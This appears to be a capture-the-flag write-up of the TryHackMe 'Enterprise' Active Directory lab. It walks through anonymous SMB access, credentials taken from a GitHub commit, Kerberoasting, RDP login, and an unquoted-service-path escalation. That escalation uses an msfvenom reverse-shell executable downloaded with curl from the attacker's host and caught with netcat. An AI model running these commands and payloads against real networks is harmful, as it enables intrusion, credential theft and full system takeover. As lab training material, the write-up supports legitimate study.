---

categories: [TryHackMe]
tags: [ Active Directory, Unquoted_Service_Path, GetUserSPNs.py, PrivEsc, OSINT, RDP]
img_path: /assets/images/
image:
  alt: Active Directory Hard Level Machine 📂
  width: "1200"
  height: "630"
  path: https://blog.tryhackme.com/content/images/2023/11/Free-Defensive-Security-Guide---Banner.svg
---
## Port Scan Results ⤵️
```bash
nmap -sV -T5 -p- -oN Nmap_Results.txt -Pn 10.10.62.184
Warning: 10.10.62.184 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.62.184
Host is up (0.18s latency).
Not shown: 65491 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-22 16:04:06Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
3937/tcp  filtered dvbservdsc
5357/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7388/tcp  filtered unknown
7990/tcp  open     http          Microsoft IIS httpd 10.0
9389/tcp  open     mc-nmf        .NET Message Framing
14636/tcp filtered unknown
15444/tcp filtered unknown
15548/tcp filtered unknown
20977/tcp filtered unknown
27650/tcp filtered unknown
28170/tcp filtered unknown
30012/tcp filtered unknown
38797/tcp filtered unknown
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49671/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49672/tcp open     msrpc         Microsoft Windows RPC
49673/tcp open     msrpc         Microsoft Windows RPC
49677/tcp open     msrpc         Microsoft Windows RPC
49704/tcp open     msrpc         Microsoft Windows RPC
49714/tcp open     msrpc         Microsoft Windows RPC
49812/tcp filtered unknown
49838/tcp open     msrpc         Microsoft Windows RPC
52266/tcp filtered unknown
58115/tcp filtered unknown
62197/tcp filtered unknown
63121/tcp filtered unknown
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
{: .nolineno}
## SMB Enumeration ⤵️

I checked the `SMB` with no creds with `netexec tool` and I got the domain name like this so I set the hosts file accordingly 🔻
![Image](Pasted%20image%2020240222213301.png)
_Domain Name : lab.enterprise.thm_
Now Lets also check the access with Anonymous username with no password ->
![Image](Pasted%20image%2020240222213636.png)
_Anonymous Access on SMB Shares !_
Lets access that 🔽
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/Enterprise]
└─$ smbclient //10.10.62.184/Docs  
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 15 08:17:35 2021
  ..                                  D        0  Mon Mar 15 08:17:35 2021
  RSA-Secured-Credentials.xlsx        A    15360  Mon Mar 15 08:16:54 2021
  RSA-Secured-Document-PII.docx       A    18432  Mon Mar 15 08:15:24 2021

		15587583 blocks of size 4096. 9922802 blocks available
smb: \>
```
{: .nolineno}
from web part I got this from port 80 ->
![Image](Pasted%20image%2020240222222230.png)
Also I checked port 7790 that also hosts a site and a HTTP port so lets see ➡️
![Image](Pasted%20image%2020240222222351.png)
_Atlassian hosted site_
I noticed the headings that states **<span style="color:#61ffe5">Remember to all Enterprise-THM Employees: We are moving to Github!</span>**

So I `OSINT `about the `Enterprise-THM` on `github` and I got an Account ->
![Image](Pasted%20image%2020240222223201.png)
_Enterprise-THM github repository_
I also noticed the number of people and I got 1 so I dig into it also and got the repo of a user named as nik.
![Image](Pasted%20image%2020240222223418.png)
_Nik-enterprise-dev_
I got something from its commit histories like these ->
![Image](Pasted%20image%2020240222223542.png)
_Credentials of Nik user_
Lets use that to check what privileges I could have ->
![Image](Pasted%20image%2020240222234628.png)
_Got access to some new shares but not able to access winrm service_
Lets collect data for bloodhound 🩸
I collected data for bloodhound like this ->
![Image](Pasted%20image%2020240222234703.png)
_bloodhound-python Tool_
I inspected this user **nik** behavior in bloodhound but got nothing so I have to try new thing since I have the credentails of user nik so lets use that credentials to get the SPN of another user 🔻
![Image](Pasted%20image%2020240223131405.png)
_GetUserSPNs.py that fetch the SPN ticket for a user_
Lets crack this hash with John the Ripper or Hashcat , I will be using John the Ripper ->
![Image](Pasted%20image%2020240223131649.png)
_John The Ripper Tool_
I have credentials of `bitbucket` user so lets see its privileges now 🔻
![Image](Pasted%20image%2020240223132202.png)
_Got Access in rdp_
Lets login into the RDP connection with `remmina` Tool ->
![Image](Pasted%20image%2020240223132900.png)
_Remmina Tool RDP connection_
```powershell
PS C:\Windows\system32> cd C:\Users
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/11/2021   1:55 PM                Administrator
d-----        3/11/2021   2:53 PM                atlbitbucket
d-----        3/11/2021   6:11 PM                bitbucket
d-----        3/11/2021   4:28 PM                LAB-ADMIN
d-r---        3/11/2021   1:27 PM                Public


PS C:\Users> cd bitbucket
PS C:\Users\bitbucket> tree /f /a
Folder PATH listing
Volume serial number is 7CD9-A0AE
C:.
+---3D Objects
+---Contacts
+---Desktop
|       user.txt
|
+---Documents
+---Downloads
+---Favorites
|   |   Bing.url
|   |
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos
PS C:\Users\bitbucket> cat Desktop\user.txt
THM{FLAG_FLAG_FLAG_FLAG_FLAG}
PS C:\Users\bitbucket>
```
{: .nolineno}
Now I have to collect some data for bloodhound so I will be uploading the `SharpHound.exe` Tool that will collect the data in a zip file that will be transferred to Attacker machine.

I got nothing while looking into bloodhound so I uploaded <span style="color:#61ffe5">winpeas.exe</span> in to the system and ran it and got this ->
![Image](Pasted%20image%2020240223160222.png)
_Unquoted Service path vulnerability_
I can exploit this lets try to create a payload using msfvenom ->
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/Enterprise]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.72.139 LPORT=445 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe

┌──(kali🔥kali)-[~/Downloads/Tryhackme/Enterprise]
└─$ mv shell.exe Zero.exe                      
```
{: .nolineno}
I also checked the permissions of this service like this ->
```powershell
get-Acl 'C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe'
```
{: .nolineno}
![Image](Pasted%20image%2020240223162013.png)
I can write it so lets include our payload without any hesitation 🔽
```powershell
PS C:\Users\bitbucket\Desktop> cd 'C:\Program Files (x86)\Zero Tier\'
cd 'C:\Program Files (x86)\Zero Tier\'
PS C:\Program Files (x86)\Zero Tier> dir
dir


    Directory: C:\Program Files (x86)\Zero Tier


Mode                LastWriteTime         Length Name                                                                                 
----                -------------         ------ ----                                                                                 
d-----        3/14/2021   6:08 PM                Zero Tier One                                                                        


PS C:\Program Files (x86)\Zero Tier> curl http://10.14.72.139/Zero.exe -o Zero.exe
curl http://10.14.72.139/Zero.exe -o Zero.exe
PS C:\Program Files (x86)\Zero Tier> dir
dir


    Directory: C:\Program Files (x86)\Zero Tier


Mode                LastWriteTime         Length Name                                                                                 
----                -------------         ------ ----                                                                                 
d-----        3/14/2021   6:08 PM                Zero Tier One                                                                        
-a----        2/23/2024   2:53 AM           7168 Zero.exe                                                                             


PS C:\Program Files (x86)\Zero Tier> sc.exe stop zerotieroneservice
sc.exe stop zerotieroneservice
[SC] ControlService FAILED 1062:

The service has not been started.

PS C:\Program Files (x86)\Zero Tier> sc.exe start zerotieroneservice
sc.exe start zerotieroneservice
```
{: .nolineno}
Lets see the netcat listener now that captured the `nt authority\system` Shell ->
```powershell
┌──(kali🔥kali)-[~/Downloads/Tryhackme/Enterprise]
└─$ rlwrap nc -lvnp 445 
listening on [any] 445 ...
connect to [10.14.72.139] from (UNKNOWN) [10.10.135.133] 50511
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
LAB-DC

C:\Windows\system32>cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7CD9-A0AE

 Directory of C:\Users\Administrator

03/11/2021  01:55 PM    <DIR>          .
03/11/2021  01:55 PM    <DIR>          ..
03/11/2021  05:47 PM    <DIR>          3D Objects
03/11/2021  05:47 PM    <DIR>          Contacts
03/14/2021  06:48 PM    <DIR>          Desktop
03/11/2021  06:14 PM    <DIR>          Documents
03/14/2021  05:05 PM    <DIR>          Downloads
03/11/2021  05:47 PM    <DIR>          Favorites
03/11/2021  05:47 PM    <DIR>          Links
03/11/2021  05:47 PM    <DIR>          Music
03/11/2021  05:47 PM    <DIR>          Pictures
03/11/2021  05:47 PM    <DIR>          Saved Games
03/11/2021  05:47 PM    <DIR>          Searches
03/11/2021  01:56 PM    <DIR>          Ubuntu
03/11/2021  05:47 PM    <DIR>          Videos
               0 File(s)              0 bytes
              15 Dir(s)  40,618,287,104 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7CD9-A0AE

 Directory of C:\Users\Administrator\Desktop

03/14/2021  06:48 PM    <DIR>          .
03/14/2021  06:48 PM    <DIR>          ..
03/14/2021  06:49 PM                37 root.txt
               1 File(s)             37 bytes
               2 Dir(s)  40,618,287,104 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{FLAG-FLAG-FLAG-FLAG-FLAG-FLAG}
C:\Users\Administrator\Desktop>
```
{: .nolineno}
I am <span style="color:#f04276">Administrator</span> Now !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }